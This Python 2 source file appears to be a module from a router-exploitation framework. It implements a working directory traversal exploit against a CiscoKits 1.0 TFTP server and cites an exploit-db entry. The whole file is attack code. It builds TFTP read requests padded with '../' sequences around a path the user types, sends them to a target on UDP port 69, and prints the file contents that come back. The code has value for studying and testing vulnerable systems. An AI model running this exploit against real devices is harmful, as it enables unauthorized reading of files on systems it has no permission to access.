from ..router_vuln import RouterVuln
import socket
import util


class kits_dtraverse(RouterVuln):

    def __init__(self):
        self.router = 'CiscoKits 1.0 TFTP'
        self.vuln   = 'Directory Traversal'
        super(kits_dtraverse, self).__init__()

        self.info = """
                    Exploit a directory traversal vulnerability
                    http://www.exploit-db.com/exploits/17619/
                    """

    def send(self, retr):
        """Send and receive"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            sock.sendto(retr, (self.config['target'].value, 69))
            data = sock.recv(1024)
            sock.close()
        except Exception, e:
            util.Error('Error with host: %s' % e)
            return None
        return data.strip()

    def initialize(self):
        try:
            while True:
                retr = raw_input('C:\\')
                retr = retr.replace('/', '\\')

                pkt = '\x00\x01'
                pkt += '../' * 10 + retr + '\x00'
                pkt += 'netascii\x00'
                data = self.send(pkt)
                print data
        except:
            return
